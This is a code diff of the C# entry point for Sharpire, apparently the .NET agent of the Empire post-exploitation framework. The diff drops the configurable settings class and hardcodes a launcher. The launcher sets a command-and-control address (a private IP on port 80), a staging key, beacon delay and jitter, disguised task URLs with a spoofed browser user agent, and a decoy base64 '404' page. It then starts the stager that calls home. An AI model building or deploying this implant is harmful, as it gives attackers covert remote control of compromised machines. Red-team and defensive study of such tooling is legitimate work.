@@ -1,151 +1,36 @@
 ﻿using System;
-using System.Configuration;
-using System.Linq;
-using System.Text.RegularExpressions;
 
-namespace Sharpire
+using Sharpire;
+
+public static class Program
 {
-    class Program
+    public static void Main()
     {
-        static void Main(string[] args)
+        try
         {
+            string profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+            string address = "http://192.168.50.139:80";
+            string stagingkey = ",o1g8_A+w4Kj&Vl/Ezkf^;e[*sX}7p0Q";
+            string workinghours = "";
+            string killdate = "";
+            uint delay = 5;
+            double jitter = 0;
+            uint lostlimit = 10;
+            string agentlanguage = "dotnet";
+            string[] arguments = { address, stagingkey,  agentlanguage};
+            string defaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg==";
 
-#if (COMMAND_LINE)
-            if (args.Length < 3)
-                return;
-            SessionInfo sessionInfo = new SessionInfo(args);
-#endif
+            SessionInfo sessionInfo = new SessionInfo(arguments);
+            sessionInfo.SetWorkingHours(workinghours);
+            sessionInfo.SetKillDate(killdate);
+            sessionInfo.SetDefaultJitter(jitter);
+            sessionInfo.SetDefaultDelay(delay);
+            sessionInfo.SetDefaultLostLimit(lostlimit);
+            sessionInfo.SetDefaultResponse(defaultResponse);
+            sessionInfo.setProfile(profile);
 
-#if (COMPILE_TIME)
-            SessionInfo sessionInfo = new SessionInfo();
-#endif
-
-#if (PRINT)
-            Console.WriteLine("EmpireServer:  {0}", sessionInfo.GetControlServers());
-            Console.WriteLine("StagingKey:    {0}", sessionInfo.GetStagingKey());
-            Console.WriteLine("AgentLanguage: {0}", sessionInfo.GetAgentLanguage());
-#endif
             (new EmpireStager(sessionInfo)).Execute();
         }
-    }
-
-    sealed class SessionInfo
-    {
-        private string[] ControlServers;
-        private readonly string StagingKey;
-        private byte[] StagingKeyBytes;
-        private readonly string AgentLanguage;
-
-        private string[] TaskURIs;
-        private string UserAgent;
-        private double DefaultJitter;
-        private uint DefaultDelay;
-        private uint DefaultLostLimit;
-
-        private string StagerUserAgent;
-        private string StagerURI;
-        private string Proxy;
-        private string ProxyCreds;
-        private DateTime KillDate;
-        private DateTime WorkingHoursStart;
-        private DateTime WorkingHoursEnd;
-        private string AgentID;
-        private string SessionKey;
-        private byte[] SessionKeyBytes;
-
-        public SessionInfo()
-        {
-            ControlServers = ConfigurationManager.AppSettings["ControlServers"].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
-            StagingKey = ConfigurationManager.AppSettings["StagingKey"];
-            AgentLanguage = ConfigurationManager.AppSettings["AgentLanguage"];
-
-            SetDefaults();
-        }
-
-        public SessionInfo(string[] args)
-        {
-            ControlServers = args[0].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
-            StagingKey = args[1];
-            AgentLanguage = args[2];
-
-            SetDefaults();
-        }
-
-        private void SetDefaults()
-        {
-            StagingKeyBytes = System.Text.Encoding.ASCII.GetBytes(StagingKey);
-            TaskURIs = ConfigurationManager.AppSettings["TaskURIs"].Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries);
-            UserAgent = ConfigurationManager.AppSettings["UserAgent"];
-            double.TryParse(ConfigurationManager.AppSettings["DefaultJitter"], out DefaultJitter);
-            uint.TryParse(ConfigurationManager.AppSettings["DefaultDelay"], out DefaultDelay);
-            uint.TryParse(ConfigurationManager.AppSettings["DefaultLostLimit"], out DefaultLostLimit);
-
-            StagerUserAgent = ConfigurationManager.AppSettings["StagerUserAgent"];
-            if (string.IsNullOrEmpty(StagerUserAgent))
-            {
-                StagerUserAgent = UserAgent;
-            }
-            StagerURI = ConfigurationManager.AppSettings["StagerURI"];
-            Proxy = ConfigurationManager.AppSettings["Proxy"];
-            ProxyCreds = ConfigurationManager.AppSettings["ProxyCreds"];
-
-            string KillDate = ConfigurationManager.AppSettings["KillDate"];
-            if (!string.IsNullOrEmpty(KillDate))
-            {
-                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
-
-                if (regex.Match(KillDate).Success)
-                    DateTime.TryParse(KillDate, out this.KillDate);
-            }
-
-            string WorkingHours = ConfigurationManager.AppSettings["WorkingHours"];
-            if (!string.IsNullOrEmpty(WorkingHours))
-            {
-                Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
-
-                string start = WorkingHours.Split(',').First();
-                if (regex.Match(start).Success)
-                    DateTime.TryParse(start, out WorkingHoursStart);
-
-                string end = WorkingHours.Split(',').Last();
-                if (regex.Match(end).Success)
-                    DateTime.TryParse(end, out WorkingHoursEnd);
-            }
-        }
-
-        public string[] GetControlServers() { return ControlServers; }
-        public string GetStagingKey() { return StagingKey; }
-        public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
-        public string GetAgentLanguage() { return AgentLanguage; }
-
-        public string[] GetTaskURIs() { return TaskURIs; }
-        public string GetUserAgent() { return UserAgent; }
-        public double GetDefaultJitter() { return DefaultJitter; }
-        public uint   GetDefaultDelay() { return DefaultDelay; }
-        public uint   GetDefaultLostLimit() { return DefaultLostLimit; }
-
-        public string GetStagerUserAgent() { return StagerUserAgent; }
-        public string GetStagerURI() { return StagerURI; }
-        public string GetProxy() { return Proxy; }
-        public string GetProxyCreds() { return ProxyCreds; }
-        public DateTime GetKillDate() { return KillDate; }
-
-        public void SetWorkingHoursStart(DateTime WorkingHoursStart)
-        {
-            this.WorkingHoursStart = WorkingHoursStart;
-        }
-        public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
-        public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }
-
-        public void SetAgentID(string AgentID) { this.AgentID = AgentID; }
-        public string GetAgentID() { return AgentID; }
-
-        public void SetSessionKey(string SessionKey)
-        {
-            this.SessionKey = SessionKey;
-            SessionKeyBytes = System.Text.Encoding.ASCII.GetBytes(SessionKey);
-        }
-        public string GetSessionKey() { return SessionKey; }
-        public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
+        catch (Exception e) { Console.WriteLine( e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
     }
 }
